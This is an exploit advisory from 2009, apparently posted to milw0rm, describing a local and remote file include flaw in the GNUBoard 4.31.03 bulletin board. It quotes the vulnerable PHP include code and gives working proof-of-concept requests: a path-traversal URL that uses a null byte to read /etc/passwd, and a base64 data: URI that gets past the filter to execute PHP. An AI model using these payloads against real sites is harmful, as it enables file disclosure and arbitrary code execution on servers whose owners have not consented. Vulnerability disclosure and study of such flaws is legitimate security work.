@@ -1,0 +1,67 @@
+GNUBoard V4.31.03 (08.12.29) Local/Remote File Include Vulnerability
+BY flyh4t#hotmail.com
+Thx to qiuren/rayt
+TEAM:Wolves Security Team
+SITE:http://bbs.wolvez.org/
+
+/*************************
+
+SIR GNUBoard (VERSION 4.31.03 (08.12.29))is a widely used bulletin board system of Korea.
+It is freely available for all platforms that supports PHP and MySQL.
+But we find a file include vulnerability affects SIR GNUBoard.
+In special conditions,it may be used as a remote file include vulnerability .
+This issue  to  execute arbitrary  PHP code on an affected computer with the privileges of the affected Web server.
+Here is the details:
+
+**************************/
+TEST ON VERSION 4.31.03 (08.12.29)
+
+/***************************
+/common.php
+
+@extract($_GET);
+@extract($_POST);
+@extract($_SERVER);
+
+……
+
+if (!$g4_path || preg_match("/:\/\//", $g4_path))
+    die("<meta http-equiv='content-type' content='text/html; '><script language='JavaScript'> alert('wrong.'); </script>");
+   
+//if (!$g4_path) $g4_path = ".";
+//it's not allow char :// in $g4_path
+$g4['path'] = $g4_path;
+
+unset($g4_path);
+
+include_once("$g4[path]/lib/constant.php");  //file include
+include_once("$g4[path]/config.php");  
+include_once("$g4[path]/lib/common.lib.php");
+
+*************************/
+
+poc:
+http://test.com/GnuBoard/common.php?g4_path=../../../../../../etc/passwd%00
+
+when the site meets PHP >= 5.2.0&allow_url_include = On, we  can  use php data bypass preg_match("/:\/\//", $g4_path)
+it's became a Remote File Include Vulnerability
+
+poc:
+/*************************
+
+bypass_local.php
+<?php
+//coded by qiuren
+if (!$g4_path || preg_match("/:\/\//", $g4_path))
+    die("fuck");
+$g4['path'] = $g4_path;
+unset($g4_path);
+include_once("$g4[path]/lib/constant.php");
+?>
+
+bypass_local.php?g4_path=data:;base64,PD9waHBpbmZvKCk7Lyo=
+
+phpinfo() can be executed
+***************************/
+
+# milw0rm.com [2009-01-15]
